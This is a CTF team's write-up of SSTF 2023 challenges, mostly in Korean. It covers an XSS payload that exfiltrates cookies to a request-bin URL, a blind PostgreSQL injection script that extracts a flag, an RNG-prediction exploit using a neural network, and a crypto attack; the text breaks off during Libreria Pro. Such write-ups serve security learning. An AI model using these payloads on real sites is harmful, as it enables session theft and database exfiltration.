# SSTF 2023 Write-Up

# Team Profile

---

- **Team name: *Cy + Kr (CyKor + PLUS + cat :flag_kr:)***
- **Rank : *3rd***
- **Nationality : *Republic of Korea*** 🇰🇷

# Solved Challenges (except for survey & tutorials)

---

- **Pwn : 3 solve**
- **Web : 3 solve**
- **Rev : 1 solve**
- **Misc : 1 solve**
- **Crypto : 2 solve**

# Writeup

---

## XSS 101

XSS on login screen looks odd. First type some random username and password. Of course the login will fail, but the `Need help?` link shows up below the login button.

Following the link, we see a form asking email address and description. I guessed that the page is some kind of reporting system commonly found in XSS challenges, and assumed that the reporting system has trivial XSS vulnerability. I used this payload in description textarea: (you should replace `reqeuestbin url` with your own request bin URL in order to try out this payload.)

```html
<img src="xxx" onerror="var r=new XMLHttpRequest();r.open(`GET`,`requestbin url?c=`+document.cookie,false);r.send()">
```

After submitting the payload, my request bin showed this reqeust:

![Capture-2023-08-19-212027.png](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Capture-2023-08-19-212027.png)

As shown in the tutorial slides, I could access `/admin.php` after setting my browser’s cookie to the retrieved one, and get the flag.

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled.png)

## Seven’s Game - Metal

```c
__int64 __fastcall init_reel_strips(__int32 (*a1)[3][64])
{
  __int64 result; // rax
  int i; // [rsp+10h] [rbp-20h]
  int j; // [rsp+14h] [rbp-1Ch]
  int k; // [rsp+18h] [rbp-18h]

  for ( i = 0; i <= 2; ++i )
  {
    for ( j = 0; j <= 31; ++j )
    {
      (*a1)[(__int64)i][2 * j] = get_urandom(3u);
      (*a1)[(__int64)i][2 * j + 1] = 5;
    }
  }
  result = (unsigned int)USE_JACKPOT;
  if ( USE_JACKPOT )
  {
    for ( k = 0; k <= 2; ++k )
    {
      result = (int)(2 * get_urandom(0x20u));
      (*a1)[(__int64)k][result] = 3;
    }
  }
  return result;
}

```

reel을 세팅하는 부분입니다. 3개의 릴은 각 64개의 숫자들로 이루어져 있고, 빈칸을 나타내는 32개의 5와 여러 색의 7을 나타내는 31개의 0~2, 그리고 다이아몬드를 나타내는 1개의 3이 있습니다.

```c
unsigned __int64 play()
{
  int result_code_div_4; // eax
  float target_0; // [rsp+4h] [rbp-6Ch] BYREF
  float v3; // [rsp+8h] [rbp-68h]
  float v4; // [rsp+Ch] [rbp-64h]
  bet_info bet_info; // [rsp+10h] [rbp-60h] BYREF
  unsigned __int64 canary; // [rsp+48h] [rbp-28h]

  canary = __readfsqword(0x28u);
  target_0 = 0.0;
  v3 = 0.0;
  v4 = 0.0;
  if ( bet <= money )
  {
    if ( total_spin < MAXIMUM_SPIN )
    {
      ++total_spin;
      bet_info.bet = bet;
      add_score(-bet);
      money -= (int)bet_info.bet;
      determine(&bet_info);
      money += (int)bet_info.result * (__int64)(int)bet_info.bet;
      if ( animation == 1 )
        spin((int *)bet_info.targets);
      add_score(bet * (__int64)(int)bet_info.result);
      target_0 = (float)(int)bet_info.targets[0];
      v3 = (float)(int)bet_info.targets[1];
      v4 = (float)(int)bet_info.targets[2];
      print_all(&target_0, 0xFFFFFFFFLL, animation == 1);
      if ( debug )
        printf(
          "bet : %d, result : %d, result_code : %d, targets : %d, %d, %d, symbol_count : %d, %d, %d, %d, %d, %d, %d\n",
          bet_info.bet,
          bet_info.result,
          bet_info.result_code,
          bet_info.targets[0],
          bet_info.targets[1],
          bet_info.targets[2],
          bet_info.symbol_count[0],
          bet_info.symbol_count[1],
          bet_info.symbol_count[2],
          bet_info.symbol_count[3],
          bet_info.symbol_count[4],
          bet_info.symbol_count[5],
          bet_info.symbol_count[6]);
      if ( (signed int)bet_info.result_code % 4 == 3 )
      {
        printf("Win 3 of ");
        result_code_div_4 = (signed int)bet_info.result_code / 4;
        if ( (signed int)bet_info.result_code / 4 == 1 )
        {
          printf("White");
        }
        else if ( result_code_div_4 > 1 )
        {
          if ( result_code_div_4 == 2 )
          {
            printf("Red");
          }
          else if ( result_code_div_4 == 6 )
          {
            printf("Mixed");
          }
        }
        else if ( !result_code_div_4 )
        {
          printf("Blue");
        }
        printf(" Sevens - Earn %d times of the difficulty!\n", bet_info.result);
      }
      else if ( bet_info.symbol_count[3] == 3 )
      {
        puts("Win the Jackpot!");
      }
    }
    else
    {
      puts("You have played too much!");
    }
  }
  else
  {
    puts("Your score is too low to play. Change your difficulty.");
  }
  return __readfsqword(0x28u) ^ canary;
}
```

1번 메뉴인 play 를 분석해보면, determine 함수를 통해 룰렛을 돌리고, debug가 활성화 되어 있다면, bet, result, result_code, targets, symbol_count를 출력해줍니다.

```c
unsigned __int64 __fastcall determine(bet_info *bet_info)
{
  int random; // eax
  int v3; // [rsp+1Ch] [rbp-64h]
  int v4; // [rsp+1Ch] [rbp-64h]
  int v5; // [rsp+1Ch] [rbp-64h]
  signed int result; // [rsp+20h] [rbp-60h]
  unsigned int result_code; // [rsp+24h] [rbp-5Ch]
  __int32 i; // [rsp+28h] [rbp-58h]
  __int32 j; // [rsp+2Ch] [rbp-54h]
  __int32 k; // [rsp+30h] [rbp-50h]
  int m; // [rsp+34h] [rbp-4Ch]
  int n; // [rsp+38h] [rbp-48h]
  int v13; // [rsp+40h] [rbp-40h]
  int random_6[4]; // [rsp+44h] [rbp-3Ch]
  int v15; // [rsp+54h] [rbp-2Ch]
  __int64 v16; // [rsp+58h] [rbp-28h]
  __int64 v17; // [rsp+60h] [rbp-20h]
  int v18; // [rsp+68h] [rbp-18h]
  unsigned __int64 v19; // [rsp+78h] [rbp-8h]

  v19 = __readfsqword(0x28u);
  v15 = 0;
  v16 = 0LL;
  v17 = 0LL;
  v18 = 0;
  result_code = 0;
  random = get_random();
  random_6[0] = random & 0x3F;
  random_6[1] = (random >> 6) & 0x3F;
  *(_QWORD *)&random_6[2] = (random >> 12) & 0x3F;
  v3 = 0;
  for ( i = 0; i < *strip_length; ++i )
  {
    v3 += strip_weight[i];
    if ( v3 > random_6[0] )
    {
      random_6[0] = i;
      break;
    }
  }
  v4 = 0;
  for ( j = 0; j < strip_length[1]; ++j )
  {
    v4 += qword_2053D8[j];
    if ( v4 > random_6[1] )
    {
      random_6[1] = j;
      break;
    }
  }
  v5 = 0;
  for ( k = 0; k < strip_length[2]; ++k )
  {
    v5 += qword_2053E0[k];
    if ( v5 > random_6[2] )
    {
      random_6[2] = k;
      break;
    }
  }
  for ( m = 0; m <= 2; ++m )
  {
    v13 = *(_DWORD *)(strips[m] + 4LL * random_6[m]);
    if ( v13 <= 2 )
      ++v18;
    ++random_6[v13 + 3];
  }
  result = 0;
  for ( n = 0; n <= 6; ++n )
  {
    bet_info->symbol_count[n] = random_6[n + 3];// symbol_count
    if ( result < *(_DWORD *)(paytable[n] + 4LL * random_6[n + 3]) )
    {
      result = *(_DWORD *)(paytable[n] + 4LL * random_6[n + 3]);
      result_code = 4 * n + random_6[n + 3];
    }
  }
  bet_info->result_code = result_code;          // result_code
  bet_info->result = result;                    // result
  bet_info->targets[0] = (2 * *strip_length + 2 * random_6[0] - 1) % (2 * *strip_length);// target1
  bet_info->targets[1] = (2 * random_6[1] - 1 + 2 * strip_length[1]) % (2 * strip_length[1]);// target2
  bet_info->targets[2] = (2 * random_6[2] - 1 + 2 * strip_length[2]) % (2 * strip_length[2]);// target3
  return __readfsqword(0x28u) ^ v19;
}
```

그리고 determine 함수는 get_random 함수로 가져온 24비트를 6비트씩 쪼갠 값들을 각 릴의 인덱스로 사용해 그 값을 가져옵니다. 여기서 각 릴에서 3 을 고른다면, 배팅액의 100000 배를 곱한 점수를 얻을 수 있습니다. 따라서 충분히 큰 값 (10000원 정도)을 베팅한다면 충분한 점수를 얻을 수 있어, 3번 메뉴를 이용해 플래그를 구매할 수 있습니다. 

```c
__int128 __usercall sigmoid@<xmm0>(double a1@<xmm0>)
{
  __int128 v1; // xmm1
  int i; // [rsp+14h] [rbp-14h]
  double v4; // [rsp+18h] [rbp-10h]
  double v5; // [rsp+20h] [rbp-8h]

  v4 = 1.0;
  v5 = 1.0;
  for ( i = 1; i <= 16; ++i )
  {
    v5 = v5 * a1 / (double)i;
    v4 = v4 + v5;
  }
  v1 = *(unsigned __int64 *)&v4;
  *(double *)&v1 = v4 / (v4 + 1.0);
  return v1;
}
```

get_random() 에서는 다음과 같은 함수를 호출합니다. 먼저 첫 번째 for문은 $1+{x \over 1!}+{x^2 \over 2!}+\cdots+{x^{16} \over 16!}$을 계산하며, 이는 $e^x$의 테일러 급수를 16차까지 전개한 형태입니다. 

따라서, 해당 함수의 반환 값은 ${e^x \over 1+e^x}$ 이며, 시그모이드 함수인 것을 알 수 있습니다.

```c
__int64 get_random()
{
	// [1]
  for ( i = 0; i <= 19; ++i )
  {
    if ( (SEED & 1) != 0 )
      v0 = 0.5;                                 // 0.5
    else
      v0 = -0.5;                                // -0.5
    v8[i + 20] = v0;
    SEED >>= 1;
  }
	  //[2]                                      // v8[20 ~ 40]
  for ( j = 0; j <= 19; ++j )
  {
    v8[j] = 0.0;
    for ( k = 0; k <= 19; ++k )
      v8[j] = w1[j][k] * v8[k + 20] + v8[j];
    v8[j] = COERCE_DOUBLE(sigmoid(v8[j])) - 0.5;
  }
	  //[3]
  for ( m = 0; m <= 17; ++m )
  {
    v8[m + 20] = 0.0;
    for ( n = 0; n <= 19; ++n )
      v8[m + 20] = w2[m][n] * v8[n] + v8[m + 20];
    *(_QWORD *)&v8[m + 20] = sigmoid(v8[m + 20]);
  }
  SEED = 0;
	  // [4]
  for ( ii = 17; ii >= 0; --ii )
  {
    SEED *= 2;
    SEED |= v8[ii + 20] >= 0.5;
  }
  SEED *= 3;
  return SEED & 0x3FFFF;
}

```

get_random 함수는 다음과 같은 과정을 수행합니다.

1. SEED 값의 20개 비트를 기반으로 -0.5,0.5로 구성된 길이 20짜리 input vector 생성
2. 랜덤하게 생성된 20x20 행렬 w1을 곱하여 새로운 길이 20짜리 vector 생성
3. 시그모이드 함수에 해당 결과 값들을 넣고, 0.5 빼기
4. 다시 랜덤하게 생성된 18x20 행렬 w2를 곱하여 길이가 18인 새로운 vector 생성
5. 마찬가지로 시그모이드 함수에 해당 결과 값을 넣고, 0.5에 대해 비교하여 SEED 생성
6. 얻은 SEED에 3을 곱하고 &0x3FFF한 값을 반환.

과정을 정리하면, get_random에서 SEED를 생성하는 방식이 인공 신경망과 유사하다는 것을 알 수 있습니다. 그럼 SEED 값은 최대 570번 지정할 수 있으며, 위에서 언급한 targets 값을 가지고 SEED 값을 알 수 있고, symbol_count 3번째 인덱스 값을 가지고 JACKPOT 에 당첨되어있는지 알 수 있습니다.

```python
import torch
import torch.nn as nn
import torch.optim as optim

class MultiLabelClassificationNN(nn.Module):
    def __init__(self):
        super(MultiLabelClassificationNN, self).__init__()

        self.fc1 = nn.Linear(20, 20, bias=False)
        self.fc2 = nn.Linear(20, 18, bias=False)  # 출력 뉴런을 18개로 설정

    def forward(self, x):
        x = self.custom_activation(self.fc1(x))
        # 출력 레이어에는 활성화 함수를 적용하지 않습니다. BCEWithLogitsLoss가 내부적으로 sigmoid를 처리합니다.
        x = self.fc2(x)
        return x
    def run_model(self, x):
        x = torch.tensor(int_to_bits(x, 20,isinput=True), dtype=torch.float32).unsqueeze(0)  # shape: (1, 20)

        # 모델의 예측 수행
        with torch.no_grad():
            model_output = model(x)
        predicted_probs = torch.sigmoid(model_output)
        predicted_labels = (predicted_probs > 0.5).int().tolist()[0]
        return bits_to_int(predicted_labels)
    def custom_activation(self, x):
        return torch.sigmoid(x) - 0.5

model = MultiLabelClassificationNN()
criterion = nn.BCEWithLogitsLoss()
optimizer = optim.Adam(model.parameters(), lr=0.005)
```

바퀴를 재발명하는 대신 pytorch로 같은 구조의 신경망을 만들어, 이를 학습시켜 결과 값을 예측했습니다. 활성화 함수는 sigmoid에 0.5를 빼도록 했고, 상수는 없으므로 bias=False 옵션을 주었습니다.
또한 출력 값이 실수가 아닌 분류에 가까우므로 손실 함수로 BCEWithLogitsLoss를 사용했습니다.

출력 값은 0,1중 하나, 입력 값은 -0.5, 0.5중 하나임에 유의해야 합니다. 

```python
from pwn import *
#"""
import torch
import torch.nn as nn
import torch.optim as optim
import random
def int_to_bits(x, num_bits,isinput=False):
    if isinput:
        return [int(i)-0.5 for i in format(x, '0' + str(num_bits) + 'b')]
    return [int(i) for i in format(x, '0' + str(num_bits) + 'b')]
def bits_to_int(bits):
    binary_str = ''.join(str(bit) for bit in bits)
    return int(binary_str, 2)

class MultiLabelClassificationNN(nn.Module):
    def __init__(self):
        super(MultiLabelClassificationNN, self).__init__()

        self.fc1 = nn.Linear(20, 20, bias=False)
        self.fc2 = nn.Linear(20, 18, bias=False)  # 출력 뉴런을 18개로 설정

    def forward(self, x):
        x = self.custom_activation(self.fc1(x))
        # 출력 레이어에는 활성화 함수를 적용하지 않습니다. BCEWithLogitsLoss가 내부적으로 sigmoid를 처리합니다.
        x = self.fc2(x)
        return x
    def run_model(self, x):
        x = torch.tensor(int_to_bits(x, 20,isinput=True), dtype=torch.float32).unsqueeze(0)  # shape: (1, 20)

        # 모델의 예측 수행
        with torch.no_grad():
            model_output = model(x)
        predicted_probs = torch.sigmoid(model_output)
        predicted_labels = (predicted_probs > 0.5).int().tolist()[0]
        return bits_to_int(predicted_labels)
    def custom_activation(self, x):
        return torch.sigmoid(x) - 0.5

model = MultiLabelClassificationNN()
criterion = nn.BCEWithLogitsLoss()
optimizer = optim.Adam(model.parameters(), lr=0.005)
#"""
r = remote("sevensgamemetal.sstf.site", 7777)
#r = process(executable="./sevensgame",argv=["./sevensgame","1000000","100000","1"])
cand=[]
def get_info():
    global diacnt
    r.sendlineafter(b": \n", b"1")
    screendata=r.recvuntil(b"bet :",drop=True)
    data = r.recvline().strip()
    data = re.findall(b"\d+",data)
    ret = {}
    ret["bet"] = int(data[0])
    ret["result"] = int(data[1])
    ret["result_code"] = int(data[2])
    ret["targets"] = []
    for i in range(3,6):
        ret["targets"].append(int(data[i]))
    ret["symbol_count"] = []
    for i in range(6,len(data)):
        ret["symbol_count"].append(int(data[i]))
    ret["SEED"] = ((ret["targets"][0] + 1) // 2 )&0x3F
    ret["SEED"] |= (((ret["targets"][1] + 1) // 2)&0x3F) << 6
    ret["SEED"] |= (((ret["targets"][2] + 1) // 2)&0x3F) << 12
    assert ret["SEED"]<=0x3FFFF
    r.sendlineafter(b": \n",b"5")
    r.sendlineafter(b": \n",b"3")
    r.sendlineafter(b": \n",b"0")
    if ret["symbol_count"][3]:
        print(screendata.decode(),ret["targets"])
    return ret
    
    
    
def get_seed():
    return get_info()['SEED']
## settings
r.sendlineafter(b": \n",b"5")
r.sendlineafter(b": \n",b"2") ## turn off animation
r.sendlineafter(b": \n",b"5") ## debug mode
r.sendlineafter(b": \n",b"0")

import tqdm
inputs=[]
targets=[]
bet = 0
for rounds in tqdm.tqdm(range(30)):
    try:
        prev=random.randrange(0,0x40000)
        r.sendlineafter(b": \n",b"5")
        r.sendlineafter(b": \n",b"4") 
        r.sendlineafter(b"?\n",f"{prev}".encode()) 
        r.sendlineafter(b": \n",b"0")
        for _ in range(10):
            info = get_info()
            seed = info['SEED']
            bet = info['bet']
            real=seed*pow(3,-1,0x40000)&0x3FFFF
            seed=real*3
            inputs.append(int_to_bits(prev,20,isinput=True))
            targets.append(int_to_bits(real,18))
            prev=seed
    except:
        break
inputs = torch.tensor(inputs, dtype=torch.float32)
targets = torch.tensor(targets, dtype=torch.float32)

num_epochs = 1000
for epoch in (range(num_epochs)):
    # 1. Forward pass
    outputs = model(inputs)

    # 2. 손실 계산
    loss = criterion(outputs, targets)

    # 3. Backward pass와 파라미터 업데이트
    optimizer.zero_grad()
    loss.backward()
    optimizer.step()
    if (epoch+1) % 50 == 0:
        r.sendlineafter(b": \n",b"5")
        r.sendlineafter(b": \n",b"3")
        r.sendlineafter(b": \n",b"0")
        print(f'Epoch [{epoch+1}/{num_epochs}], Loss: {loss.item():.4f}')

r.sendlineafter(b": \n",b"5")
r.sendlineafter(b": \n",b"3")
r.sendlineafter(b": \n",b"0")

x=eval(input('diamond index : '))
print(x)

ans = ((x[0] + 1) // 2 )&0x3F
ans |= (((x[1] + 1) // 2)&0x3F) << 6
ans |= (((x[2] + 1) // 2)&0x3F) << 12

r.sendlineafter(b": \n",b"5")
r.sendlineafter(b": \n",b"3")
r.sendlineafter(b": \n",b"0")

final=[]
def reverse_model(ans):
    assert ans<=0x3FFFF
    for i in tqdm.tqdm(range(1<<20)):
        if i%100000==0:
            r.sendlineafter(b": \n",b"5")
            r.sendlineafter(b": \n",b"3")
            r.sendlineafter(b": \n",b"0")
        x=model.run_model(i)
        if bin(((x*3)&0x3FFFF)^ans).count('1') < 3:
            print(i)
            r.sendlineafter(b": \n",b"5")
            r.sendlineafter(b": \n",b"3")
            r.sendlineafter(b": \n",b"0")

            r.sendlineafter(b": \n",b"5")
            r.sendlineafter(b": \n",b"4") 
            r.sendlineafter(b"?\n",f"{i}".encode())
            r.sendlineafter(b": \n",b"0")

            if get_info()["symbol_count"][3]==3:
                print(bin((x*3)&0x3FFFF)[2:].zfill(18))
                print(bin(ans)[2:].zfill(18))
                print(bin(((x*3)&0x3FFFF)^ans)[2:].zfill(18))                
                return i
ans=reverse_model(ans)

r.sendlineafter(b": \n",b"5")
r.sendlineafter(b": \n",b"4") 
r.sendlineafter(b"?\n",f"{ans}".encode())
r.sendlineafter(b": \n",b"0")

r.sendlineafter(b": \n",b"2")
r.sendlineafter(b"]\n",b"10000")

r.sendlineafter(b": \n",b"1")

r.sendlineafter(b": \n",b"3")
r.sendlineafter(b": \n",b"1")

r.interactive()
```

알고리즘은 다음과 같습니다.

1. 300개의 입출력 순서쌍을 얻어온다.
2. 이를 통해 신경망을 학습시킨다
3. 300개의 입출력 순서쌍을 얻어오는 과정에서 알아낸 다이아몬드의 위치를 직접 입력한다
4. 2^20개의 가능한 입력에 대해 모두 검증해보면서, 우리가 원하는 결과와 2비트 이하 차이나면 직접 테스트해본다
5. 다이아 3개가 나오는 케이스를 찾으면 베팅금액을 높이고 게임을 한 뒤, flag를 얻어낸다.

**FLAG : `SCTF{M4k3_y0ur_Own_1uck}`**

## meaas

exp, mod를 각각 d, n으로 고정시킬 수 있습니다.

mod를 2p+1=q 꼴의 작은 소수로, base는 GF(q)에 대한 생성원으로 하면,

우리는 d를 2p로 나눈 나머지를 구할 수 있습니다.

따라서, 여러가지 q에 대해 이를 시도하고, CRT를 통해 d를 계산해낼 수 있습니다.

```python
import requests
import json
from Crypto.Util.number import getPrime, long_to_bytes
from hashlib import sha512

n=142279362596553912224655297226700733514552660689709810513345154350345746185887515861123542614103888301543234469605744615437646435079188336249119463590058020792277090683637455303252433495716397344646744998042450363215302595987117906550802425441792299373794353320390613172040557615261705991448956653912780040873
e=11035971693989005873759402626999128461666359128625952822750674188152762293240126961360764634990950511241494197654313768345661411938605027938829794598142117
treasure=37390385431874189713613604490205529131497857010409452566115943008220420972423103673299513212626382905330650855094314574739903487
hint=0b110

def h(x,mod):
	data={"loglevel":"0","use_d":"true","use_n":"","mod":str(mod),"base":str(x)}
	r=requests.post("http://meaas.sstf.site/modexp",json=data)
	return json.loads(r.content)['res']
	
cand=[]
for _ in range(1,1500):
	q=Primes()[_]
	if q//2 in Primes():
		cand.append(q)
print(cand)
#홀수..
a=[]
b=[]
for can in cand:
	F=GF(can,modulus="primitive")
	x=F.gen()
	y=F(h(ZZ(x),ZZ(can)))
	p=can//2
	l=ZZ(y.log(x))
	a.append(l)
	b.append(can//2)
d=crt(a,b)
print(d.nbits())

xor = lambda a, b: bytes([x^^y for x, y in zip(a, b)])
treasure=bytes.fromhex(hex(treasure)[2:])
flag=xor(sha512(long_to_bytes(d)).digest(),treasure)
print(flag)

```

**FLAG :** `SCTF{Even_tiny_clu3_c4n_d1$cl0sE_3veRythIn9_c3a23820}`

## Colorbit

```jsx
<script>
        let colors = [336, 230, 57, 160, 24, 313, 174, 173, 90, 62, 278, 78, 237, 359, 222, 64, 60, 122, 214, 256, 291, 186, 171, 187, 139, 79, 334, 120, 188, 102, 166, 157, 321, 9, 223, 19, 11, 133, 34, 192, 267, 44, 151, 216, 212, 315, 258, 126, 241, 281, 309, 97, 293, 39, 322, 282, 246, 244, 190, 172, 54, 47, 15, 36, 202, 247, 168, 26, 242, 38, 8, 30, 326, 339, 111, 304, 354, 239, 134, 76, 268, 20, 353, 45, 75, 319, 94, 131, 144, 200, 165, 229, 308, 1, 231, 61, 270, 196, 114, 161, 16, 81, 316, 175, 49, 3, 352, 53, 201, 99, 158, 7, 340, 335, 219, 194, 297, 146, 185, 116, 55, 31, 66, 51, 50, 106, 218, 182, 260, 205, 341, 273, 129, 103, 52, 197, 140, 211, 204, 337, 154, 95, 69, 294, 207, 276, 138, 342, 89, 299, 193, 264, 159, 279, 272, 325, 28, 348, 345, 18, 87, 92, 296, 96, 255, 347, 162, 226, 280, 110, 250, 70, 203, 82, 71, 132, 13, 145, 301, 259, 32, 137, 343, 243, 181, 23, 224, 210, 73, 238, 119, 252, 136, 215, 14, 257, 33, 338, 346, 351];
        function getRandomIntInclusive(min, max) {
          min = Math.ceil(min);
          max = Math.floor(max);
          return Math.floor(Math.random() * (max - min + 1)) + min;
        }

        function onChangeBox(e) {
          let value = document.getElementById("selectBox").value;
          document.getElementById("boxColor").value = colors[value];
        };
        
        function onApply() {
          let boxNum = document.getElementById("selectBox").value;
          let color = document.getElementById("boxColor").value;
          const boxClassName = `block${boxNum}`;
          for (let elem of document.getElementsByClassName(boxClassName)) {
            elem.style.backgroundColor = `hsl(${color}, ${getRandomIntInclusive(0,100)}%, ${getRandomIntInclusive(0,100)}%)`;
          };
          colors[boxNum] = color;
        };
    </script>
```

index.html에서 흥미로운 내용은 다음과 같습니다.

- stylesheet에 hsl color code로 색을 표현하는 .block0부터 .block399까지 있는데 block[i]와 block[i+200]은 v와 s만 다르다.
- 스크립트에 정의된 함수는 .block0부터 .block199까지 hsl color code로 색을 변경할 수 있다.(colors 배열이 200 길이임)

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%201.png)

index.html을 실행하면 위 이미지와 같은데 이는 .block을 수만 개 배치하여 나타나는 이미지입니다. 

⇒ 특정 픽셀들은 flag를 표현해야 하기 때문에 통계적으로 flag를 표현하는 .block과 그렇지 않은 .block은 서로 다른 빈도수를 가지고 있을 것으로 추측할 수 있습니다.

실제로 위 이미지에서 .block의 빈도수를 측정하면 특정 .block은 100 근처, 그렇지 않은 .block은 800 근처로 나타났습니다. 이에 착안하여 flag를 표현하는 .block은 100 근처에서 나타난다고 판단하고 빈도 수가 500보다 낮으면 백색, 그렇지 않으면 흑색을 칠했습니다. 

script에서 컬러를 변경할 수 있는 .block 번호의 범위가 [0,199]이므로 흑, 백 부여 또한 그 범위 내에서 진행했습니다.

```diff
@@ -408,6 +408,8 @@
       .block397 { background-color: hsl(338, 41%, 70%) }    
       .block398 { background-color: hsl(346, 68%, 82%) }    
       .block399 { background-color: hsl(351, 84%, 45%) }    
+      .block400 { background-color: hsl(351, 0%, 0%) }  
+      .block401 { background-color: hsl(351, 100%, 100%) }
 
       .row {
         display: flex;
```

```python
f = open("index.html", "r").read()

res = []
for i in range(400):
    res.append(f.count("block"+str(i)+"'"))

print(res[:200])
print(res[200:])

for i in range(200):
    if res[i] > 500:
        f = f.replace("<div class='box block" + str(i)+"'></div>", "<div class='box block" + str(400)+"'></div>")
    else:
        f = f.replace("<div class='box block" + str(i)+"'></div>", "<div class='box block" + str(401)+"'></div>")

open("answer.html", "w").write(f)
```

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%202.png)

## Libreria

취약점은 rest.php에서 발생합니다.

cmd가 `requestbook` 일 때, isbn을 검색해 이미 DB에 있는 번호이며 10 자리가 넘어가는 경우 이미 책을 가지고 있다는 메시지와 받은 isbn 번호를 띄워줍니다. 

이 서비스에서 사용하는 다른 쿼리의 경우 인자를 넣을 때 prepare statement를 사용하기 때문에 SQL injection이 불가능합니다. 하지만 `requestbook` 서비스의 경우 isbn의 길이가 10글자만 넘어가기만 하면 그대로 쿼리에 넣어주기 때문에 SQLi가 발생합니다.

```php
case 'requestbook':
		if ((isset($_GET['isbn']) && strlen($_GET['isbn']) >= 10)) {
			$res = '{"res": "Sorry, but our budget is not enough to buy <a href=\'https://isbnsearch.org/isbn/'.$_GET['isbn'].'\'>this book</a>."}';
			$db = dbconnect();
			$result = pg_query($db, "SELECT ISBN FROM books WHERE isbn='".$_GET['isbn']."'");
			pg_close($db);
			if ($result) {
				$rows = pg_fetch_assoc($result);
				if ($rows) {
					$isbn = (int)$rows["isbn"];
					if (($isbn >= 1000000000) && ((string)$isbn === $rows["isbn"]))
					{
						$res = '{"res": "We already have this book('.$rows["isbn"].')."}';
					}
				}
			}
		}
```

그러나, 결과가 `$res` 를 바꾸지 못하거나 invalid query를 보낼 경우 `Sorry, but our ~~` 라는 결과를 띄웁니다. 정확한 쿼리문의 결과가 아닌 성공 여부만 알 수 있기 때문에 blind sql injection을 사용하였습니다.

처음에는 mysql이라고 가정하고 exploit을 시도했으나, 오류가 발생하였고 이후 mysql이 아닌 ***postgresql***을 사용한다는 것을 깨달았습니다. 쿼리를 postgresql에서 동작하도록 수정하여 문제를 해결할 수 있었습니다.

`LIMIT a,b → LIMIT b OFFSET a`

최종적으로 사용한 쿼리는 다음과 같습니다.

`1' or CASE WHEN (ASCII(substring((SELECT table_name from information_schema.tables WHERE table_schema='books' LIMIT 1 OFFSET 0),"+*str*(idx)+",1))="+*str*(val)+") THEN true ELSE false END-- -`

main db의 이름은 `config.php` 파일에서 dbname을 `books` 로 설정하는 부분을 보고 알아냈고, LIMIT OFFSET을 통해 하나씩 table을 검색하니 `adminonly` 와 `employee` 라는 이름의 table을 찾을 수 있었습니다.

 이 중 adminonly의 칼럼을 뽑아보면,

`1' or CASE WHEN (ASCII(substring((SELECT column_name from information_schema.columns WHERE table_name='adminonly' LIMIT 1 OFFSET 0),"+*str*(idx)+",1))="+*str*(val)+") THEN true ELSE false END-- -`

`value` 라는 칼럼에 플래그가 있을 것이라 예측하여 확인해보았습니다.

`1' or CASE WHEN (ASCII(substring((SELECT value from adminonly LIMIT 1 OFFSET 1),"+*str*(idx)+",1))>"+*str*(val)+") THEN true ELSE false END-- -`

OFFSET을 0으로 주고 뽑으면 `Good job!` 이라는 문구만 뜨고 끝나지만, OFFSET을 1로 주면 flag를 획득 할 수 있었습니다.

플래그를 추출하는 최종 payload는 다음과 같습니다.

```python
from requests import get
from urllib import parse

URL = "http://libreria.sstf.site/rest.php?cmd=requestbook&isbn="
column_nm = ""

# # find each byte of columns with binary-search algorithm
# for i in range(1, 15):
#     left = 0
#     right = 128
#     while left <= right:
#         mid = (left+right)//2
#         r = get(URL+parse.quote("1' or CASE WHEN (ASCII(substring((SELECT column_name from information_schema.columns WHERE table_name='adminonly' LIMIT 1 OFFSET 2),"+str(i)+",1))="+str(mid)+") THEN true ELSE false END-- -"))
#         if "9781329837294" in r.text:
#             break
#         r = get(URL+parse.quote("1' or CASE WHEN (ASCII(substring((SELECT column_name from information_schema.columns WHERE table_name='adminonly' LIMIT 1 OFFSET 2),"+str(i)+",1))>"+str(mid)+") THEN true ELSE false END-- -"))
#         print("mid:", chr(mid))
#         print(r.text)
#         if "9781329837294" in r.text:
#             left = mid+1
#         else:
#             right = mid-1
#     print("found", chr(mid))
#     column_nm += chr(mid)
#    print("leaked :", column_nm)

# leak length of SCTF flag
r = get(URL+parse.quote("1' or CASE WHEN (char_length(SELECT value from adminonly LIMIT 1 OFFSET 1)=51) THEN true ELSE false END-- -"))
print(r.text)

flag = ""

# find each byte of flag with binary-search algorithm
for i in range(1, 100):
    left = 0
    right = 128
    while left <= right:
        mid = (left+right)//2
        r = get(URL+parse.quote("1' or CASE WHEN (ASCII(substring((SELECT value from adminonly LIMIT 1 OFFSET 1),"+str(i)+",1))="+str(mid)+") THEN true ELSE false END-- -"))
        if "9781329837294" in r.text:
            break
        r = get(URL+parse.quote("1' or CASE WHEN (ASCII(substring((SELECT value from adminonly LIMIT 1 OFFSET 1),"+str(i)+",1))>"+str(mid)+") THEN true ELSE false END-- -"))
        print("mid:", chr(mid))
        print(r.text)
        if "9781329837294" in r.text:
            left = mid+1
        else:
            right = mid-1
    print("found", chr(mid))
    flag += chr(mid)
    print("leaked :", flag)
```

**FLAG :** `SCTF{SQL_i5_4_l4n9uage_t0_man4G3_d4ta_1n_Da7aba$e5}` 

## Libreria Pro

이전 Libreria에서 `rest.php` 의 취약한 requestbook이 사라지고,
대신 search option 기능이 추가되었습니다.

우선 유효하지 않은 path에 접근하니 다음과 같은 에러 페이지가 떴습니다.

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%203.png)

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%204.png)

Apache 기본 404 page가 나오는 것이 아닌, Django DEBUG MODE를 통해 에러 메시지가 그대로 나오는 것을 볼 수 있습니다. 이를 이용해 추후 code leak을 할 수 있었습니다.

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%205.png)

일단 이전 문제와 다른 점은  `search_with=title` 의 존재입니다.
새로운 기능이니 여기에서 취약점이 터질 것이라고 생각했고. 이곳에 `'` 를 집어넣어 확인했습니다.

![Untitled](SSTF%202023%20Write-Up%205228d86e56b64d0fbd25e85316aa55bf/Untitled%206.png)

`Invalid Request` 를 뱉는 것을 확인할 수 있습니다. 다음으로는 `search_with`를 year로 설정하고 Keyword에 int 형식이 아닌 걸 집어넣었을 때 어떤 현상이 일어나는지 확인했습니다.

